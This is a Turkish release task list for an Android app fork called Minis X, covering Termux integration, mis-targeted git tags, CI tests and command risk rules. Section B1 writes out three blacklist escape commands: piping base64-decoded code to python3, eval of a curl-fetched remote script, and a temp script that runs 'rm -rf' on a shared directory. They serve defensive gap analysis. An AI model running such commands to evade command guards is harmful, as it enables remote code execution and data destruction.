# SIRADAKİ SÜRÜM — `37098` / `1.15-ozel.17` · iş listesi

**Tek bekleyen sürüm bu.** `.16` yayınlanmadı, `.17`'ye katlandı: yayın tek
seferde yapılacak, iki ayrı bekleyen sürüm tutmak yanıltıcı.

> Kural: bir sürüm yayınlandığında bu dosya **yeniden yazılır**, üstüne
> eklenmez. Geçmiş: `docs/ozel/DEGISIKLIK-GUNLUGU-11-16.md`.

---

## A0 · Termux katmanı — kullanıcı isteği, öncelik 1

**Tasarım:** `docs/ozel/TERMUX-ENTEGRASYONU.md` (ölçümler, T1–T10 test matrisi,
reddedilen seçenekler).

| Faz | İş | Durum |
|---|---|---|
| **P1** | `TermuxLayer` (258 satır) + 3 risk kuralı + 13 test + korpus 9 satır | ✅ **hazır** |
| **P2** | `PRootKernel`: `-b /system -b /apex` + `TermuxLayer.environment` enjeksiyonu | ⬜ |
| **P2** | `RootfsManager.USER_TREES` += `data/data/com.termux` | ⬜ **kritik** |
| **P2** | Kurulum akışı (indir → sha256 → aç → SYMLINKS.txt → home → sources → smoke) | ⬜ |
| **P3** | `ToolchainScreen`: "Termux katmanı" kartı + prob sonucu + adım göstergesi | ⬜ |
| **P3** | Terminal oturum başlığında katman rozeti (`ALPINE` / `TERMUX`) | ⬜ |
| **P4** | `sshd` anahtar tabanlı, parola kapalı, 30 dk otomatik kapanma | ⬜ |
| **P5** | Ölçüm tablosunu doldur (kurulum süresi, RAM, `apt update` boyutu) | ⬜ |

**P2'de en kolay atlanan ve en pahalı olan:** `USER_TREES`. `.10.1`'de aynı hata
yaşandı — rootfs yeniden çıkarılınca 1,4 GB'lık araç zinciri silinmişti.

**P2 bitmeden arayüz yazılmasın.** Kurulum çalışmayan bir "Kur" düğmesi, boş
vaattir; bu depoda o sınıf hata (`FANOUT`, `STATION`, `CHAT_HEALTH`) üç kez
tekrarlandı.

---

## A1 · Yayın öncesi — kapanmalı

Kimlik `.14`'ten beri sabit: `com.minis.x` / **Minis X**.

### A2 · Etiketlerin yeniden hedeflenmesi — **karar bekliyor**
`v1.15-ozel.11.3.1`, `.11.4`, `.13`, `.14`, `.15` etiketlerinin **beşi de**
`ffeb948` (`11.2` / 37029) commit'ini gösteriyor. Release nesneleri doğru APK'yı
taşıyor; yanlış olan etiket → commit bağı.

Neden bloklayıcı: `RELEASE_REPO` bu çatala bakıyor. Kullanıcı ya "güncelleme
yok" görür ya da 37029 indirilir; Android düşük `versionCode`'u reddeder ve
açıklamasız "Uygulama yüklenemedi" çıkar.

Plan hazır, uygulanmadı (uzak etiket silme geri dönüşsüz):
```bash
python3 scripts/ozel/tag-denetim.py --fix-plan
```

| Etiket | Doğru commit | versionCode |
|---|---|---|
| `v1.15-ozel.11.3.1` | `98c8f10` | 37030 |
| `v1.15-ozel.11.4` | `db2566e` | 37033 |
| `v1.15-ozel.13` | `241b470` | 37090 |
| `v1.15-ozel.14` | `73ba3ed` | 37091 |
| `v1.15-ozel.15` | `db55d4c` | 37092 |

### A3 · CI'da üç yeni test ilk kez koşacak
`RiskCorpusTest`, `ApprovalInboxTest`, `TermuxLayerTest`. Bu cihazda JVM başlamadığı için hiç
koşmadılar. Kırmızı çıkarlarsa **sürüm çıkmamalı** — `apk.yml`'deki
`needs: tests` bunu zorunlu kılıyor ama `ozel-guard.yml` de artık korpusu
saniyeler içinde denetliyor.

### A4 · `ozel-guard.yml` ilk koşu
Yeni iş. Üç kontrol: korpus, yapı, etiket. A2'nin aksine **dakikalar değil
saniyeler** sürüyor. İlk koşuda kırmızı olursa hangi kontrol olduğunu adıyla
söylüyor.

---

## B. Ölçülmüş, henüz kapatılmamış boşluklar

### B1 · Kara listenin yapısal sınırı (mimari)
`.16` üç somut kaçış yolunu kapattı ama sınıf kapanmadı:

```bash
echo "aW1wb3J0IHNodXRpbDs..." | base64 -d | python3   # kod metinde değil
eval "$(curl -s https://x/y.sh)"                      # kod uzakta
printf 'rm -rf /var/minis/shared' > /tmp/a.sh && bash /tmp/a.sh
```

Doğru cevap kara listeyi büyütmek değil. İki yol var:
1. **`bash`/`sh` çağrılarını `shell:interpreter` kapsamına al** — `bash x.sh`
   de denetlenemez kod çalıştırmaktır. Tek satırlık kural, gürültüsü düşük.
2. **Gerçek sandbox** (seccomp/landlock): `write` iznini `isScratch ∪ isTemp`
   ile sınırla. Mimari iş, ayrı sürüm.

### B2 · `mv` hedefi çözülemediğinde
`.16` bunu HIGH'tan MEDIUM'a çekti (göreli yol oturum dizininde kalır). Ama
`mv $DEGISKEN /var/minis/shared` gibi bir komutta hedef **yazma** yönüdür ve
tahmin edilemez. Kural: `mv`'nin **ikinci** argümanı da hedef sayılmalı.

### B3 · Compare koşuları `TeamRunStore`'a yazılmıyor
`TeamRunStore.record` `CouncilOutcome` alıyor; Compare'ın claim/konsensüsü yok.
Sahte boş konsensüs uydurmak yerine kayıt hiç yazılmamış (doğru karar), ama
sonuç: **Compare geçmişi yok**. Doğru çözüm `TeamRunStore`'a ikinci bir kayıt
biçimi (`FanoutOutcome`) eklemek.

### B4 · `ChatHealthBridge` yalnız Canlı Görevler'de
Üst çubuk (sohbetin kendisi) ikinci tüketici. Köprü hazır; `ChatScreen`'e chip
eklemek ayrı iş. Ölçüt: chip 96dp'yi geçmemeli (bkz. `UY` sözleşmesi).

---

## C. Belgeler (Termux sonrası)

### C1 · `FORK.md` §5/§6 `.10` anlatıyor
Kimlik `.14`'te (`com.minis.x`), sürüm şeması `.13`'te (37090+) değişti.
Bu bölümler yanlış bilgi taşıyor. `.16`'da dokunulmadı: yarım düzeltme
yanlıştan kötü. Tek seferde, ölçerek yeniden yazılmalı.

### C2 · `docs/ozel/IS-LISTESI-2026-11-20.md` ve eski denetim belgeleri
Aynı gün üç farklı plan dosyası var. Biri (`SIRADAKI-SURUM.md`) tek kaynak
olmalı; diğerleri `arsiv/`'e taşınmalı.

---

## Yapılmayacaklar

- iOS derlemesi (macOS/Xcode ister).
- Upstream'de zaten olan özelliklerin yeniden yazımı.
- `ui/station/` — paneller ayrı sürüm; o gelene kadar `STATION` satırı da yok.
- `37090` uzaktan konsol — jeton modeli var, sunucu yok; ürün kararı bekliyor.
